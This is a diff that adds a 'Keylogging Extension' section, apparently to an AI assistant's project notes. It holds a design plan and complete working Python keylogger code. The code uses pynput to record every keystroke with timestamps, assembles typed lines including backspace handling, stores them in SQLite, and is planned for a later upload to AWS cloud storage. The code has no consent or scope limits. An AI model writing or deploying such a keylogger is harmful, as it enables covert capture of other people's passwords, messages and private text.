@@ -88,3 +88,158 @@ Would you like me to help you:
     Add a CLI tool to decrypt specific date ranges or export to CSV?
 
 Let me know your next step.
+
+---
+
+Keylogging Extension
+
+Goals Recap
+
+    Capture keystrokes in real-time with timestamps.
+
+    Store both individual keystrokes and combined text strings for later analysis.
+
+    Use a secure local database (SQLite for POC).
+
+    Design modular code to allow easy connection to a free-tier AWS storage (like S3 or DynamoDB).
+
+    Maintain real-time nature for data insertion and retrieval.
+
+Solution Overview
+
+    SQLite local database for secure, low-latency local storage.
+
+    Tables:
+
+        keystrokes: stores every key event with timestamp.
+
+        text_strings: stores combined text strings (like words or lines) with timestamps.
+
+    Modular design: Database operations separated into a class/module.
+
+    Background thread to batch or handle text string formation while logging keystrokes in real-time.
+
+    Prepared for easy AWS integration by abstracting DB write operations (can later replace or extend with AWS SDK calls).
+
+```python
+
+import os
+import sqlite3
+from datetime import datetime
+from threading import Thread, Lock
+from pynput import keyboard
+
+# --- Configurable Database Path from environment variable ---
+db_path = os.getenv("KEYLOGGER_DB_PATH", "keylogger.db")
+os.makedirs(os.path.dirname(db_path), exist_ok=True) if os.path.dirname(db_path) else None
+
+# --- Database Handling Class ---
+class KeyLoggerDB:
+    def __init__(self, db_file):
+        self.conn = sqlite3.connect(db_file, check_same_thread=False)
+        self.lock = Lock()
+        self.create_tables()
+
+    def create_tables(self):
+        with self.lock:
+            c = self.conn.cursor()
+            c.execute('''
+                CREATE TABLE IF NOT EXISTS keystrokes (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    key TEXT NOT NULL,
+                    timestamp TEXT NOT NULL
+                )
+            ''')
+            c.execute('''
+                CREATE TABLE IF NOT EXISTS text_strings (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    text TEXT NOT NULL,
+                    timestamp TEXT NOT NULL
+                )
+            ''')
+            self.conn.commit()
+
+    def insert_keystroke(self, key):
+        with self.lock:
+            timestamp = datetime.utcnow().isoformat()
+            self.conn.execute('INSERT INTO keystrokes (key, timestamp) VALUES (?, ?)', (key, timestamp))
+            self.conn.commit()
+
+    def insert_text_string(self, text):
+        with self.lock:
+            timestamp = datetime.utcnow().isoformat()
+            self.conn.execute('INSERT INTO text_strings (text, timestamp) VALUES (?, ?)', (text, timestamp))
+            self.conn.commit()
+
+    def close(self):
+        self.conn.close()
+
+
+# --- Text Buffer Manager for combined text strings ---
+class TextBufferManager:
+    def __init__(self, db):
+        self.db = db
+        self.buffer = []
+        self.lock = Lock()
+
+    def add_key(self, key):
+        with self.lock:
+            if key == "ENTER":
+                # commit buffer as a string then clear
+                if self.buffer:
+                    combined = ''.join(self.buffer)
+                    self.db.insert_text_string(combined)
+                    self.buffer.clear()
+            elif key == "BACKSPACE":
+                if self.buffer:
+                    self.buffer.pop()
+            else:
+                # Append normal characters
+                self.buffer.append(key)
+
+    def flush(self):
+        with self.lock:
+            if self.buffer:
+                combined = ''.join(self.buffer)
+                self.db.insert_text_string(combined)
+                self.buffer.clear()
+
+
+# --- Listener for keyboard events ---
+def start_keylogger(db):
+    buffer_manager = TextBufferManager(db)
+
+    def on_press(key):
+        try:
+            if hasattr(key, 'char') and key.char is not None:
+                k = key.char
+            else:
+                # Special keys
+                k = key.name.upper() if hasattr(key, 'name') else str(key)
+        except AttributeError:
+            k = str(key)
+
+        db.insert_keystroke(k)
+        buffer_manager.add_key(k)
+
+    def on_release(key):
+        if key == keyboard.Key.esc:
+            # Flush any buffered text before exit
+            buffer_manager.flush()
+            return False
+
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+
+if __name__ == "__main__":
+    db = KeyLoggerDB(db_path)
+    print(f"Keylogger started. Press ESC to stop. Logging to {db_path}")
+    try:
+        start_keylogger(db)
+    finally:
+        db.close()
+        print("Keylogger stopped and database closed.")
+```
+
+---
